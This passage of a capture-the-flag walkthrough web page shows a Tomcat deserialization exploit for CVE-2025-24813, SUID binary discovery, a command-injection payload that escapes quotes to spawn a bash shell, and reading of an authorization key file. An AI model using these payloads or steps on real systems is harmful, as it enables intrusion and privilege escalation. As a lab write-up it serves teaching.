<span class="w">    </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Sending<span class="w"> </span>GET<span class="w"> </span>request<span class="w"> </span>with<span class="w"> </span>session<span class="w"> </span>cookie...
<span class="w">    </span><span class="o">[</span>GET<span class="o">]</span><span class="w"> </span>Status:<span class="w"> </span><span class="m">500</span><span class="w"> </span>
<span class="w">    </span>&lt;!doctype<span class="w"> </span>html&gt;&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="w"> </span>Status<span class="w"> </span><span class="m">500</span><span class="w"> </span>–<span class="w"> </span>Internal<span class="w"> </span>Server<span class="w"> </span>Error&lt;/title&gt;&lt;style<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>&gt;body<span class="w"> </span><span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span><span class="o">}</span><span class="w"> </span>h1,<span class="w"> </span>h2,<span class="w"> </span>h3,<span class="w"> </span>b<span class="w"> </span><span class="o">{</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span><span class="w"> </span>h1<span class="w"> </span><span class="o">{</span>font-size:22px<span class="p">;</span><span class="o">}</span><span class="w"> </span>h2<span class="w"> </span><span class="o">{</span>font-size:16px<span class="p">;</span><span class="o">}</span><span class="w"> </span>h3<span class="w"> </span><span class="o">{</span>font-size:14px<span class="p">;</span><span class="o">}</span><span class="w"> </span>p<span class="w"> </span><span class="o">{</span>font-size:12px<span class="p">;</span><span class="o">}</span><span class="w"> </span>a<span class="w"> </span><span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span><span class="w"> </span>.line<span class="w"> </span><span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="w"> </span>Status<span class="w"> </span><span class="m">500</span><span class="w"> </span>–<span class="w"> </span>Internal<span class="w"> </span>Server<span class="w"> </span>Error&lt;/h1&gt;&lt;hr<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;line&quot;</span><span class="w"> </span>/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;<span class="w"> </span>Exception<span class="w"> </span>Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;<span class="w"> </span>class<span class="w"> </span>javax.management.BadAttributeValueExpException<span class="w"> </span>cannot<span class="w"> </span>be<span class="w"> </span>cast<span class="w"> </span>to<span class="w"> </span>class<span class="w"> </span>java.lang.Long<span class="w"> </span><span class="o">(</span>javax.management.BadAttributeValueExpException<span class="w"> </span>is<span class="w"> </span><span class="k">in</span><span class="w"> </span>module<span class="w"> </span>java.management<span class="w"> </span>of<span class="w"> </span>loader<span class="w"> </span><span class="p">&amp;</span><span class="c1">#39;bootstrap&amp;#39;; java.lang.Long is in module java.base of loader &amp;#39;bootstrap&amp;#39;)&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class java.lang.Long (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; java.lang.Long is in module java.base of loader &amp;#39;bootstrap&amp;#39;)</span>
<span class="w">            </span>org.apache.catalina.session.StandardSession.doReadObject<span class="o">(</span>StandardSession.java:1199<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.session.StandardSession.readObjectData<span class="o">(</span>StandardSession.java:846<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.session.FileStore.load<span class="o">(</span>FileStore.java:203<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.session.PersistentManagerBase.loadSessionFromStore<span class="o">(</span>PersistentManagerBase.java:723<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.session.PersistentManagerBase.swapIn<span class="o">(</span>PersistentManagerBase.java:672<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.session.PersistentManagerBase.findSession<span class="o">(</span>PersistentManagerBase.java:467<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.connector.Request.doGetSession<span class="o">(</span>Request.java:2722<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.connector.Request.getSessionInternal<span class="o">(</span>Request.java:2467<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.authenticator.AuthenticatorBase.invoke<span class="o">(</span>AuthenticatorBase.java:451<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.valves.ErrorReportValve.invoke<span class="o">(</span>ErrorReportValve.java:93<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.valves.AbstractAccessLogValve.invoke<span class="o">(</span>AbstractAccessLogValve.java:660<span class="o">)</span>
<span class="w">            </span>org.apache.catalina.connector.CoyoteAdapter.service<span class="o">(</span>CoyoteAdapter.java:346<span class="o">)</span>
<span class="w">            </span>org.apache.coyote.http11.Http11Processor.service<span class="o">(</span>Http11Processor.java:388<span class="o">)</span>
<span class="w">            </span>org.apache.coyote.AbstractProcessorLight.process<span class="o">(</span>AbstractProcessorLight.java:63<span class="o">)</span>
<span class="w">            </span>org.apache.coyote.AbstractProtocol<span class="nv">$ConnectionHandler</span>.process<span class="o">(</span>AbstractProtocol.java:936<span class="o">)</span>
<span class="w">            </span>org.apache.tomcat.util.net.NioEndpoint<span class="nv">$SocketProcessor</span>.doRun<span class="o">(</span>NioEndpoint.java:1791<span class="o">)</span>
<span class="w">            </span>org.apache.tomcat.util.net.SocketProcessorBase.run<span class="o">(</span>SocketProcessorBase.java:52<span class="o">)</span>
<span class="w">            </span>org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker<span class="o">(</span>ThreadPoolExecutor.java:1190<span class="o">)</span>
<span class="w">            </span>org.apache.tomcat.util.threads.ThreadPoolExecutor<span class="nv">$Worker</span>.run<span class="o">(</span>ThreadPoolExecutor.java:659<span class="o">)</span>
<span class="w">            </span>org.apache.tomcat.util.threads.TaskThread<span class="nv">$WrappingRunnable</span>.run<span class="o">(</span>TaskThread.java:63<span class="o">)</span>
<span class="w">            </span>java.base/java.lang.Thread.run<span class="o">(</span>Thread.java:829<span class="o">)</span>
<span class="w">    </span>&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt;<span class="w"> </span>The<span class="w"> </span>full<span class="w"> </span>stack<span class="w"> </span>trace<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>root<span class="w"> </span>cause<span class="w"> </span>is<span class="w"> </span>available<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>server<span class="w"> </span>logs.&lt;/p&gt;&lt;hr<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;line&quot;</span><span class="w"> </span>/&gt;&lt;h3&gt;Apache<span class="w"> </span>Tomcat/9.0.90&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre></div>
</details>
<p>Perfect! This is actually what success looks like. Here's what happened:</p>
<p><strong>PUT Request (409 Conflict):</strong> The server responds with a <code>409</code> because the session already exists. No problem! The malicious serialized payload still gets written to disk in Tomcat's session storage.</p>
<p><strong>GET Request (500 Internal Server Error):</strong> This is the good part! The <code>500</code> error proves our exploit worked. Here's what's happening:</p>
<ul>
<li>The<code>GET</code> request triggers Tomcat to load our poisoned session from disk</li>
<li>Tomcat deserializes our payload using Java's <code>readObject()</code></li>
<li>The <code>CommonsCollections5</code> gadget chain activates and executes our command (<code>touch /tmp/frosty_wuz_hear</code>)</li>
<li>The server crashes with a <code>ClassCastException</code> because our payload object can't complete deserialization properly</li>
</ul>
<p>The stack trace confirms deserialization occurred:</p>
<div class="highlight"><pre><span></span><code>org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1199)
org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:846)
</code></pre></div>
<p>The crash happens after our command executes. The <code>500</code> error is our victory bell ringing! 🔔</p>
<p>Bingo! Remote code execution achieved. But did it actually work? Time to verify our calling card was delivered:</p>
<div class="highlight"><pre><span></span><code>ls<span class="w"> </span>-la<span class="w"> </span>/tmp/frosty_wuz_hear
</code></pre></div>
<p><img alt="First screenshot" src="../../img/objectives/o21/s3.png" /></p>
<p>There it is! The file exists and is owned by the <code>snowcat</code> user. We're now running commands as <code>snowcat</code>. Not bad for a Tomcat clone! But we need more power to access those authorization keys.</p>
<hr />
<h3 id="hunting-for-privilege-escalation-paths">Hunting for Privilege Escalation Paths<a class="headerlink" href="#hunting-for-privilege-escalation-paths" title="Permanent link">⚓︎</a></h3>
<p>Running as <code>snowcat</code> is nice and cozy, but those weather binaries Tom mentioned probably have better credentials. Time to hunt for <code>SUID</code> binaries! These special files run with their owner's permissions rather than ours, and if the owner is <code>root</code>... well, that's our golden ticket! 🎫</p>
<div class="admonition info">
<p class="admonition-title">Finding SUID Binaries</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>
</div>
<p><img alt="First screenshot" src="../../img/objectives/o21/s4.png" /></p>
<p>Oooh, lookie! Three <code>SUID</code> binaries owned by <code>root</code>, all sitting in <code>/usr/local/weather/</code>:</p>
<ul>
<li>temperature</li>
<li>humidity</li>
<li>pressure</li>
</ul>
<p>These are the exact same binaries the dashboard JSP calls for weather data! When these <code>SUID</code> <code>root</code> binaries execute, they run with <code>root</code> privileges no matter who launches them. If we can exploit one of them, we'll escalate faster than mercury in July! Let's examine one with <code>strings</code> to see what secrets it holds:</p>
<div class="highlight"><pre><span></span><code>strings<span class="w"> </span>/usr/local/weather/temperature
</code></pre></div>
<p><img alt="First screenshot" src="../../img/objectives/o21/s5.png" /></p>
<p>Now we're getting somewhere! The strings output reveals:</p>
<ul>
<li>References to <code>/usr/local/weather/logUsage</code> script</li>
<li>A format string pattern: <code>%s '%s' '%s'</code> (command execution vibez!)</li>
<li>Key validation against <code>/usr/local/weather/keys/authorized_keys</code></li>
</ul>
<p>This smells fishier than a tuna casserole left out overnight (bleeeeh). The binary is probably executing something along the lines of:</p>
<div class="highlight"><pre><span></span><code>/usr/local/weather/logUsage<span class="w"> </span><span class="s1">&#39;temperature&#39;</span><span class="w"> </span><span class="s1">&#39;our-key-here&#39;</span>
</code></pre></div>
<p>Notice those single quotes? If we can escape them, we can inject our own commands and ride this SUID binary straight to elevated privileges! <em>Classic</em> command injection waiting to happen...</p>
<hr />
<h3 id="breaking-free-with-command-injection">Breaking Free with Command Injection<a class="headerlink" href="#breaking-free-with-command-injection" title="Permanent link">⚓︎</a></h3>
<p>Time to test our theory! We'll use the legitimate weather monitoring key we found earlier in the dashboard.jsp code, but with a little extra seasoning. Our goal: spawn a shell by escaping those single quotes.</p>
<div class="admonition info">
<p class="admonition-title">Command Injection Payload</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span>/usr/local/weather/temperature<span class="w"> </span><span class="s2">&quot;4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6&#39;; /bin/bash; #&quot;</span>
</code></pre></div>
</div>
<p>Here's how our payload works its magic:</p>
<ul>
<li><code>4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6'</code> - Closes the first single quote the binary adds (this is the weather system's key from <code>dashboard.jsp</code>!)</li>
<li><code>;</code> - Ends that command</li>
<li><code>/bin/bash</code> - Starts our glorious shell</li>
<li><code>;</code> - Ends our command</li>
<li><code>#</code> - Comments out everything after (including the closing quote the binary will try to add)</li>
</ul>
<p>The binary thinks it's just logging temperature usage, but we're actually breaking out and spawning a shell. Let's do this!</p>
<p><img alt="First screenshot" src="../../img/objectives/o21/s6.png" /></p>
<p>We're in! You'll see the temperature value <code>1.61</code> output first (that's the legitimate temperature reading), then a <code>.bashrc: Permission denied</code> error (normal for restricted shells), but most importantly, check out our new identity: the shell is running as the <code>weather</code> user, courtesy of that <code>SUID</code> bit doing exactly what it's supposed to do (just not what the developers intended). We've escalated from <code>snowcat</code> to <code>weather</code>, and now we can access files that were previously off limits!</p>
<hr />
<h3 id="raiding-the-authorization-vault">Raiding the Authorization Vault<a class="headerlink" href="#raiding-the-authorization-vault" title="Permanent link">⚓︎</a></h3>
<p>Remember that <code>/usr/local/weather/keys/authorized_keys</code> file we spotted in the strings output? That's our target! Now that we're running as the <code>weather</code> user, we should have access to it. Time to see what secrets it holds:</p>
<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/usr/local/weather/keys/authorized_keys
</code></pre></div>
<p><img alt="First screenshot" src="../../img/objectives/o21/s7.png" /></p>
<p>Aha! Two keys in the vault:</p>
<ul>
<li>4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6 - Our old friend from the dashboard.jsp (the weather monitoring system's key)</li>
<li><strong>8ade723d-9968-45c9-9c33-7606c49c2201</strong> - The mysterious stranger!</li>
</ul>
<p>The second key must be the "other application's" authorization key Tom needs! Let's hand it over:</p>
<div class="admonition success">
<p class="admonition-title">The Key!!</p>
<p>8ade723d-9968-45c9-9c33-7606c49c2201</p>
</div>
<p>And that's how you thaw out a frozen weather station! We exploited <code>CVE-2025-24813</code> to get our foot in the door as <code>snowcat</code>, discovered some poorly secured <code>SUID</code> binaries, injected commands to escalate to the <code>weather</code> user, and finally retrieved the hidden API key. Tom's weather monitoring is back online and the neighborhood can rest easy knowing when the next blizzard is coming! ❄️</p>
<div class="nav-buttons">
  <a href="/objectives/o20" class="nav-button nav-left">← Hack-a-Gnome</a>
  <a href="/objectives/o22" class="nav-button nav-right">Next: Schrödinger's Scope →</a>
</div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
    <a href="https://twitter.com/Aeronique" target="_blank" rel="noopener" title="Twitter" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
    </a>
  
    
    
    
    
    <a href="https://github.com/Aeronique" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
    <a href="https://www.linkedin.com/michelle-duell" target="_blank" rel="noopener" title="Linkedin" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
      
        <script src="../../js/tablesort.js"></script>
      
    
  </body>
</html>